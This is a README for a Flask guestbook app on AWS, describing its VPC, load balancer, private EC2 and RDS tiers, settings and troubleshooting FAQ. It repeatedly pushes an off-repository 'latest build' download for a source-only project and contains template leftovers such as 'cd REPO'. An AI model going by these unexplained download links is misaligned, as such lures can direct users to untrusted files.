# AWS 3-Tier Guestbook Application - Cloud Web Application 2026

> **A Flask guestbook running on Amazon Web Services, using an Application Load Balancer, separate application and database tiers, and Amazon RDS MySQL for persistence.**

[![Platform](https://img.shields.io/badge/Platform-Amazon%20Web%20Services-blue?style=flat-square)](https://github.com)
[![Version](https://img.shields.io/badge/Version-Not%20specified-green?style=flat-square)](https://github.com)
[![Updated](https://img.shields.io/badge/Updated-2026-red?style=flat-square)](https://github.com)
[![License](https://img.shields.io/badge/License-GPL--3.0-yellow?style=flat-square)](LICENSE)
[![Stars](https://img.shields.io/github/stars/kevinpricelsa4351/aws-3tier-guestbook-app?style=flat-square)](https://github.com/kevinpricelsa4351/aws-3tier-guestbook-app)

---

<p align="center">
  <a href="https://kevinpricelsa4351.github.io/aws-3tier-guestbook-app/">
    <img src="https://img.shields.io/badge/Download-AWS%203--Tier%20Guestbook%20Application%20Latest-brightgreen?style=for-the-badge" alt="Download AWS 3-Tier Guestbook Application">
  </a>
</p>

> **[Download AWS 3-Tier Guestbook Application](https://kevinpricelsa4351.github.io/aws-3tier-guestbook-app/)**

---

[Download Latest Build](https://kevinpricelsa4351.github.io/aws-3tier-guestbook-app/)

---

## Overview

AWS 3-Tier Guestbook Application provides a responsive web interface where visitors can add guestbook messages and browse existing entries. A Flask REST API connects that interface to an application server kept in a private network and to an Amazon RDS MySQL database.

This project illustrates a layered AWS deployment in which public requests, application execution, and persistent data are separated. The design combines Amazon VPC networking, subnet and route-table boundaries, security groups, an Application Load Balancer, EC2, Apache, and RDS.

---

## Highlights

- Browser-based guestbook for creating and reading entries
- Flask REST API supporting guestbook actions
- Apache reverse-proxy configuration
- Application Load Balancer handling internet-facing requests
- Public and private subnet organization in Amazon VPC
- EC2 application host located in a private tier
- Amazon RDS MySQL database kept private
- Route tables and security groups controlling communication between tiers
- Persistent storage for submitted guestbook content

---

## Installation

Check out the repository locally:

```bash
git clone https://github.com/kevinpricelsa4351/aws-3tier-guestbook-app.git
cd REPO
```

Before deploying the application, create the required AWS components: an Amazon VPC, public and private subnets, route tables, security groups, an Application Load Balancer, an EC2 instance, and an Amazon RDS MySQL database.

Install the Flask application on the application server and configure Apache to proxy requests to it. Database connection settings must be supplied before the service is launched. The precise deployment commands vary according to the selected machine image, operating system, and infrastructure definitions.

---

## Deployment and Use

A deployment generally follows this sequence:

1. Build the VPC and its public/private subnet arrangement.
2. Attach the Application Load Balancer to the public subnets.
3. Install the Flask application on the private EC2 instance.
4. Set Apache to pass incoming requests through to Flask.
5. Create the Amazon RDS MySQL instance in a private subnet.
6. Apply route-table and security-group rules to limit allowed traffic.
7. Visit the Application Load Balancer endpoint in a web browser.
8. Add a guestbook message and browse the stored entries.

The guestbook UI sends its operations to the Flask REST API. Submitted content is retained in the MySQL database.

---

## Application Settings

Provide environment-specific values through the application environment or the configuration method used by the deployment:

```text
FLASK_ENV=production
DB_HOST=<private-rds-endpoint>
DB_PORT=3306
DB_NAME=<database-name>
DB_USER=<database-user>
DB_PASSWORD=<database-password>
```

Do not place database secrets in committed source files. Apache should point to the private address of the Flask service, and the EC2 security group should allow only the connections needed from the load balancer and database tiers.

---

## Prerequisites

- An AWS account with access to:
  - Amazon VPC
  - Amazon EC2
  - Application Load Balancer
  - Amazon RDS for MySQL
  - Security groups, subnets, and route tables
- A Python runtime compatible with Flask
- Apache HTTP Server for reverse-proxy forwarding
- A MySQL database
- Connectivity from the application server to the private RDS instance
- Adequate AWS compute and storage capacity for the chosen EC2 and RDS configurations

---

## Frequently Asked Questions

### Which release version is available?

The supplied project metadata does not identify a numbered release. The repository and download link above provide the currently available build.

### Where does guestbook data live?

The intended storage location is an Amazon RDS MySQL database in the private database tier.

### What path does a public request take?

A request first arrives at the Application Load Balancer. The load balancer forwards it to the private EC2 application server, where Apache reverse-proxies the request to Flask.

### How should deployment configuration be managed?

Set values with environment variables or the deployment configuration facility on the application server. Never commit database credentials to the repository.

### What should I inspect if MySQL connectivity fails?

Check the RDS hostname and port, credentials, subnet routing, and the security-group permissions governing traffic between EC2 and RDS.

### What should I inspect if the load balancer endpoint is unavailable?

Examine the listener configuration, target health, public-subnet routes, EC2 service state, Apache settings, and inbound security-group rules.

### What is the update process?

Check out the required repository revision, apply any necessary Flask or Apache configuration changes, verify database connectivity, and restart the applicable service.

---

## License

GNU GPL v3.0 - see [LICENSE](LICENSE) for details.
